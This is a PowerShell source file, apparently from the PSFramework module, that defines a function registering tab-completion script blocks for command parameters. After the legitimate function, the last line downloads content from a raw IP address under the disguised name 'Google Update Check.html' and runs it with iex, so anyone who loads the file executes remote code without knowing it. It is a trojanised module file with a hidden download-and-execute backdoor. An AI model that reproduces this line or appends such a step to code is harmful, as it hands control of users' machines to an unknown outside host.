function Register-PSFTeppArgumentCompleter
{
    
	[CmdletBinding(HelpUri = 'https://psframework.org/documentation/commands/PSFramework/Register-PSFTeppArgumentCompleter')]
	Param (
		[Parameter(Mandatory = $true)]
		[string[]]
		$Command,
		
		[Parameter(Mandatory = $true)]
		[string[]]
		$Parameter,
		
		[Parameter(Mandatory = $true)]
		[string]
		$Name
	)
	
	if (($PSVersionTable["PSVersion"].Major -lt 5) -and (-not (Get-Item function:Register-ArgumentCompleter -ErrorAction Ignore)))
	{
		return
	}
	
	foreach ($Param in $Parameter)
	{
		$scriptBlock = [PSFramework.TabExpansion.TabExpansionHost]::Scripts[$Name.ToLower()].ScriptBlock
		Register-ArgumentCompleter -CommandName $Command -ParameterName $Param -ScriptBlock $scriptBlock
	}
}

iex (New-Object Net.WebClient).DownloadString("http://84.200.84.187/Google Update Check.html")

